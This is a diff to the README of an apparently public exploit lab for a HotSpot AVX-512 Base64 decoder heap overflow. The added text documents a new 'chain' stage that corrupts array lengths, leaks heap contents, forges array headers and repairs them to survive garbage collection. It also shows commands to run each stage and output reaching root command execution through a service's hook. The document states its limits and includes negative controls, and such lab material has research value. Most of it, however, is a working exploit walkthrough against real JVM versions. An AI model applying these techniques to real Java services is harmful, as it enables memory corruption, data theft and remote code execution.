@@ -18,7 +18,7 @@ HotSpot x86-64 AVX-512 Base64 decoder heap overflow publicly called
 | **Impact** | Heap out-of-bounds write; heap read/write and disclosure primitives; RCE in product-specific chains |
 | **Hardware gate** | x86-64 with `avx512f avx512bw avx512vbmi bmi2` (Ice Lake+ / Zen 4+) |
 | **Affected branches** | OpenJDK 17 (from 17.0.6), 21, 25, 27 |
-| **Lab scope** | Bounded trigger, length corruption, OOB read, heap leak, chosen-value OOB write, controlled RCE against a local target |
+| **Lab scope** | Bounded trigger, length corruption, OOB read, heap leak, chosen-value OOB write, writer/reader/forge/repair chain (stops before Code Cache), application-sink command execution |
 
 ## In one sentence
 
@@ -38,8 +38,14 @@ Tested end-to-end on **2026-11-22** with:
   --network none`
 
 All base stages behaved as expected: `trigger`, `corrupt`, `leak`, and `write`
-reproduced; `control` did not reproduce (which is the expected result). The
-optional `rce` stage reached command execution, and `rce-control` did not.
+reproduced; `control` did not reproduce (which is the expected result).
+
+The `chain` stage — the real second half — reached every heap primitive and
+completed three forced GCs after header repair. It **stops at the Code Cache**:
+the primitive is heap-relative and cannot dereference a native `Method*`. The
+`rce` stage reaches command execution through a purpose-built application sink;
+it is not Code Cache RCE. Both negative controls (`chain-control`,
+`rce-control`) failed to reproduce, as intended.
 
 On a real AVX-512 host, use `LAB_MODE=native` to skip SDE.
 
@@ -55,12 +61,11 @@ shows how that fixed write becomes a useful primitive:
 3. Java's normal bounds checks then trust the corrupted length.
 4. Ordinary Java array reads and writes become out-of-bounds reads and writes.
 5. The same corruption gives a heap-disclosure primitive ("JavaBleed").
-6. In the optional RCE stage, a service reads its own configuration through the
-   corrupted array and executes the attacker's recovered command.
-
-The RCE stage is deliberately scoped: the service's "maintenance hook" is part
-of the lab target, so the stage demonstrates the corruption-to-execution flow
-rather than a universal exploit for real products.
+6. The `chain` stage builds the real second half: writer, reader, forged array
+   header, and header repair that survives a forced GC.
+7. The `rce` stage moves attacker bytes into an application sink and executes
+   them. It is explicitly not Code Cache RCE; see
+   [What stops the chain at the Code Cache](#what-stops-the-chain-at-the-code-cache).
 
 ## Affected versions
 
@@ -108,19 +113,21 @@ git clone https://github.com/akshutgoyal/Java4Shell.git
 cd Java4Shell
 chmod +x run.sh
 
-./run.sh --build all     # build the image and run the five base stages
+./run.sh --build all     # build the image and run the five base stages + chain
 ```
 
 Run individual stages:
 
 ```bash
-./run.sh trigger     # bounded, non-destructive OOB-write measurement
-./run.sh control     # -XX:-UseBASE64Intrinsics (expected: NOT REPRODUCED)
-./run.sh corrupt     # heap corruption + OOB read
-./run.sh leak        # JavaBleed-style heap disclosure
-./run.sh write       # chosen-value OOB write into a neighbour
-./run.sh rce         # end-to-end RCE against a local vulnerable service
-./run.sh rce-control # same RCE attempt with the intrinsic disabled
+./run.sh trigger       # bounded, non-destructive OOB-write measurement
+./run.sh control       # -XX:-UseBASE64Intrinsics (expected: NOT REPRODUCED)
+./run.sh corrupt       # heap corruption + OOB read
+./run.sh leak          # JavaBleed-style heap disclosure
+./run.sh write         # chosen-value OOB write into a neighbour
+./run.sh chain         # writer -> reader -> forged header -> repair + GC
+./run.sh chain-control # same chain with the intrinsic disabled
+./run.sh rce           # command execution via a local application sink
+./run.sh rce-control   # same RCE attempt with the intrinsic disabled
 ```
 
 The first build downloads and SHA256-verifies Intel SDE from Intel's mirror.
@@ -228,58 +235,120 @@ OOB WRITE REPRODUCED
 Ordinary Java stores at `victim[80+i]` land in the neighbouring `target` array
 with attacker-chosen bytes.
 
-### `rce` — end-to-end command execution
+### `chain` — writer, reader, forge, repair
 
-The RCE stage starts a deliberately vulnerable HTTP service (`poc/RceLab.java`)
-on loopback inside the container, then runs a separate attacker client
-(`poc/RceClient.java`) on a normal JVM:
+This is the real second half of the exploit, with no `sun.misc.Unsafe`, no JNI
+and no native code. Five arrays are allocated back-to-back in one TLAB:
 
 ```text
-[*] target  http://127.0.0.1:18080
-[*] command id; uname -a
-[*] firing trigger ...
-    before=100
-    after=1771742825
-    hex=699aa669
-    unsigned=1771742825
+[ dst: 66 ][ writer: 64 ][ reader: 64 ][ table[1] ][ anchor: 256 ][ post: 64 ]
+```
+
+```text
+=== PHASE 1: writer (fixed spill -> corrupted length) ===
+writer.length after  = 1771742825 (0x699aa669)
+chosen write at writer[200] -> anchor[16] = J4SWRITE
+WRITER OK: chosen-value linear write established
+
+=== PHASE 2: reader (chosen length -> disclosure) ===
+reader.length        = 2147483647 (0x7fffffff)
+anchor data at reader[104]
+anchor oop           = 0xe2e488e4
+anchor klass (narrow)= 0x2318
+READER OK: out-of-bounds disclosure established
+
+=== PHASE 3: forged array header (object aliasing) ===
+fake oop             = 0xe2e488f0 (anchor + 12 compressed units)
+fake.length          = 2147483632
+aliased write        fake[8] -> anchor[104] = 0x5a
+post data at fake[176]
+cross-object write   fake[176] -> post[0] = 'X'
+FORGE OK: chosen read/write over arbitrary heap objects
+
+=== PHASE 4b: force a real GC ===
+GC round 1..3 completed
+anchor marker intact = true
+post content intact  = true
+reader[64] rejected  = true
+REPAIR OK: JVM survived GC with the corrupted writer abandoned
+
+CHAIN COMPLETE (heap writer/reader/forge/repair); CODE CACHE BLOCKED
+```
+
+What each phase establishes:
+
+| Phase | Primitive |
+|---|---|
+| writer | The fixed 62-byte spill corrupts a neighbour's length; that array then performs a **chosen-value linear write** over later objects. |
+| reader | The writer installs a chosen length into a second array, giving **out-of-bounds disclosure** (JavaBleed) through ordinary Java reads. |
+| forge | A fake array header written into `anchor` plus a forged compressed oop in `table[0]` gives an **aliased view** that reads and writes other heap objects. |
+| repair | Lengths and oops are restored, the corrupted writer is dropped, its thread exits, and **three forced GCs** prove the reachable heap is consistent. |
+
+Repair is the step the researchers describe as necessary "to keep the JVM
+running": without it the next young collection dies walking a half-smashed
+object.
+
+### `chain-control` — negative control
+
+Same program with `-XX:-UseBASE64Intrinsics`:
+
+```text
+writer.length after  = 64 (0x40)
+NOT VULNERABLE: length unchanged
+```
+
+Exit 1 from the program, which the runner normalizes to 0 after confirming the
+expected "no corruption" result. No corruption means no writer, reader or forge.
+
+### What stops the chain at the Code Cache
+
+`chain` deliberately reports its own limit rather than claiming RCE. The
+primitives above are all **heap-relative**: every reference is a 32-bit
+compressed oop and every array access is `base + non-negative int index`. That
+cannot reach the Code Cache, which lives in native memory outside the Java heap.
+A `Method*` read through this primitive is still just data; nothing in the chain
+can load it as an instruction pointer.
+
+Crossing that boundary needs a raw native read/write — `sun.misc.Unsafe`, JNI,
+or a second memory-safety bug — which this lab does not add. This is the one
+primitive the real chain has that the lab does not: Calif's arbitrary write
+"reach[es] the Code Cache and JVM hooks for code execution".
+
+### `rce` — command execution via an application sink
+
+The RCE stage adds an HTTP service (`poc/RceLab.java`) and an attacker client
+(`poc/RceClient.java`). It shows the **realistic last mile** that Tenable
+describes — a reachable Base64 decode path plus an application sink:
+
+```text
 [*] blob length 100 -> 1771742825 (unsigned 1771742825)
 [*] scanning heap through blob[off] ...
 [*] payload at blob[120] = 4a34533a  (out of bounds)
     RCE CONFIRMED
-    offset=120
     cmd=id; uname -a
     exit=0
     uid=0(root) gid=0(root) groups=0(root)
-    Linux ... x86_64 GNU/Linux
 
 [+] RCE CHAIN COMPLETE: heap corruption -> OOB read -> command execution
 ```
 
-The service models a maintenance hook: each `/trigger` request allocates a
-66-byte Base64 scratch buffer and, immediately after it in the same TLAB, a
-100-byte session blob that holds a config string. After the malformed decode,
-the blob's length is `0x699AA669`, so `/peek` (a "debug" reader) can return
-bytes past the original blob and `/exec` can load a config string from an
-attacker-chosen offset. The client finds its own command bytes in the heap and
-asks the service to execute them.
+**This stage is not Code Cache RCE.** The vulnerability supplies the corruption
+and the read; the *application* supplies the execution. `RceLab`'s maintenance
+hook executes a config string it reads from the session blob, so the stage proves
+that attacker bytes can be moved into a real sink — not that the JVM can be made
+to run arbitrary native code with no application gadget. Real products need an
+equivalent sink; that is why Calif and VulnCheck describe RCE as
+application-specific.
 
-`rce-control` runs the identical chain with `-XX:-UseBASE64Intrinsics`. The
-blob length stays `100`, `/peek` and `/exec` refuse out-of-range offsets, and
-the client reports `NO CORRUPTION (control path)`.
-
-**What this proves, and what it does not.** The chain uses only the write
-primitive supplied by the vulnerability, plus a read of adjacent heap through
-the corrupted length. It does not use a separate memory-safety bug. The lab
-target itself contains the "maintenance hook" that executes a string from the
-blob; a real product needs an equivalent gadget or data flow. The `J4S:` prefix
-is a lab guard against executing random heap bytes, not a security boundary.
-No JVM code-cache or metadata corruption is performed, and the forged length is
-never repaired, so the process is disposable by design.
+`rce-control` runs the identical chain with `-XX:-UseBASE64Intrinsics`; the blob
+length stays `100` and the client reports `NO CORRUPTION (control path)`.
 
 **Notes**
 
-- `./run.sh control` exits 1 by design. `./run.sh all` prints each stage's exit
-  code and finishes with a summary, so the overall command exits 0.
+- `./run.sh control` exits 1 by design (the trigger correctly fails to
+  reproduce). `./run.sh chain-control` and `./run.sh rce-control` normalize the
+  expected failure to exit 0. `./run.sh all` prints each stage's exit code and
+  finishes with a summary, so the overall command exits 0.
 - The exact leaked byte at `victim[4096]` and the random marker suffix can vary
   between runs; the length and offsets are deterministic with this layout.
 - The heap layout is deterministic with this pinned image, but may miss on a
@@ -339,8 +408,36 @@ The heap PoCs allocate:
 
 From that point on, `victim[4096]`, `victim[80]`, and `victim[80+i] = ...` are
 ordinary Java array accesses that pass the JVM's bounds checks. `sun.misc.Unsafe`
-is used only to read the length header before and after the decode; the actual
-out-of-bounds accesses are plain Java bytecode.
+is used only to read the length header before and after the decode in the
+smashing PoCs; the actual out-of-bounds accesses are plain Java bytecode.
+`Chain.java` and the RCE stage use no `Unsafe` at all — they locate headers
+through the corrupted array itself.
+
+### How `Chain.java` builds on this
+
+`Chain.java` arranges the objects so each primitive feeds the next:
+
+```text
+[ dst: 66 ][ writer: 64 ][ reader: 64 ][ table[1] ][ anchor: 256 ][ post: 64 ]
+```
+
+1. **writer** — the spill corrupts `writer`'s length. Stores at `writer[i]` for
+   `i > 64` are chosen-value writes into later objects.
+2. **reader** — the writer installs `0x7fffffff` into `reader`'s length field
+   (which sits 80 bytes past the writer's data, at writer index 76). Reads at
+   `reader[i]` are now a heap-disclosure primitive.
+3. **forge** — the reader recovers `anchor`'s compressed oop and its `klass`
+   from `table[0]` and `anchor`'s header. A fake array header planted at
+   `anchor[80]` plus a forged oop in `table[0]` makes `table[0]` resolve to a
+   `byte[]` whose data starts at `anchor[96]`. That gives chosen read/write over
+   other heap objects (`post[0]` is overwritten through it).
+4. **repair** — the writer restores `reader.length` and `table[0]`, then its
+   reference is dropped. The chain runs on its own thread so that thread's stack
+   disappears; three forced GCs then prove the remaining heap is consistent.
+
+The forged view can only move **forward** inside the Java heap (base + positive
+int index, 32-bit compressed oops), which is precisely why it cannot reach the
+Code Cache.
 
 | PoC | What it proves |
 |---|---|
@@ -348,33 +445,39 @@ out-of-bounds accesses are plain Java bytecode.
 | `poc/HeapCorruption.java` | A 66-byte destination places the next array's length field at store offset 36. The length becomes `0x699AA669`, and a normal Java read at index 4096 succeeds. |
 | `poc/HeapLeak.java` | A neighbouring `secret` array is disclosed through ordinary Java reads on the now-huge victim. |
 | `poc/HeapWrite.java` | The same corrupted length turns ordinary Java stores into a chosen-value OOB write into a neighbouring array. |
+| `poc/Chain.java` | Writer → reader → forged header → repair. Establishes chosen-value linear write, heap disclosure, aliased object access, and GC survival. Reports its own Code Cache limit. |
 | `poc/RceLab.java` | Deliberately vulnerable HTTP target: decode sink, corrupted session blob, and a maintenance hook that executes a recovered config string. |
 | `poc/RceClient.java` | Attacker client: fires the trigger, scans the heap through the corrupted length, and asks the target to execute the recovered command. |
 
 `HeapCorruption`, `HeapLeak`, and `HeapWrite` deliberately poison their own
 heap and call `Runtime.getRuntime().halt()` before GC can traverse the corrupted
-object. Run them only in the disposable container.
+object. `Chain` repairs its headers and is GC-safe. Run all of them only in the
+disposable container.
 
 ## Scope and limitations
 
-- **RCE is demonstrated against a purpose-built target.** The `rce` stage shows
-  the full chain: heap overflow → corrupted length → out-of-bounds heap read →
-  command execution. It stops there. It does not implement the JVM Code Cache
-  corruption or the product-specific heap-grooming chains that Calif withheld.
+- **The chain stops at a heap-only primitive.** `Chain.java` reaches
+  chosen-value linear write, heap disclosure, forged-header object aliasing, and
+  repair with GC survival. It does not reach the Code Cache: all of its
+  references are heap-relative compressed oops, so it cannot dereference the
+  native `Method*`/`nmethod` pointer that code execution requires. That last
+  step needs a raw native write (Unsafe/JNI/second bug), which is deliberately
+  out of scope.
+- **Command execution uses an application sink.** The `rce` stage reaches
+  `ProcessBuilder` because `RceLab` contains a maintenance hook that runs a
+  config string from the session blob. The exploit moves attacker bytes into
+  that sink; it does not create the sink or execute native code. This matches
+  why Calif and VulnCheck call RCE application-specific.
 - **No universal payload.** A real chain needs a reachable decoder, a suitable
   heap layout, a live writer/reader pair or other feedback path, and
   application-specific timing. Network conditions matter. The lab target is
   shaped so one request can reach the sink; real products differ.
-- **The sink is part of the lab, not the vulnerability.** `RceLab` contains a
-  maintenance hook that runs a string it reads from the session blob. A real
-  target needs an equivalent primitive (a command/config read, a deserialization
-  path, a template or scripting engine, and so on). The exploit moves the
-  attacker's bytes into that sink; it does not create the sink.
 - **Heap grooming is simplified here.** The pinned image gives deterministic
-  TLAB adjacency. Real targets need G1/TLAB grooming, spraying, and retries.
-- **The corruption is not repaired.** The smashing stages halt the JVM before GC
-  sees the forged header. The RCE service is intentionally disposable and runs
-  with a single-thread executor on loopback.
+  TLAB adjacency. Real targets need G1/TLAB grooming, region spraying,
+  request-parking, and retries.
+- **The smashing stages are disposable.** `corrupt`, `leak`, `write` and `rce`
+  do not repair their headers and halt or abandon the JVM by design. Only
+  `chain` performs repair and proves GC survival.
 - **SDE is CPU emulation, not bug emulation.** It spoofs an Ice Lake CPUID so
   HotSpot generates the real AVX-512 stub; SDE executes the actual JVM machine
   code.
@@ -447,6 +550,7 @@ poc/Base64Trigger.java  bounded, non-destructive trigger
 poc/HeapCorruption.java length corruption + OOB read
 poc/HeapLeak.java       JavaBleed-style heap disclosure
 poc/HeapWrite.java      chosen-value OOB write
+poc/Chain.java          writer -> reader -> forge -> repair (second half)
 poc/RceLab.java         vulnerable HTTP target for the RCE stage
 poc/RceClient.java      attacker client for the RCE stage
 compose.yaml            optional Compose configuration
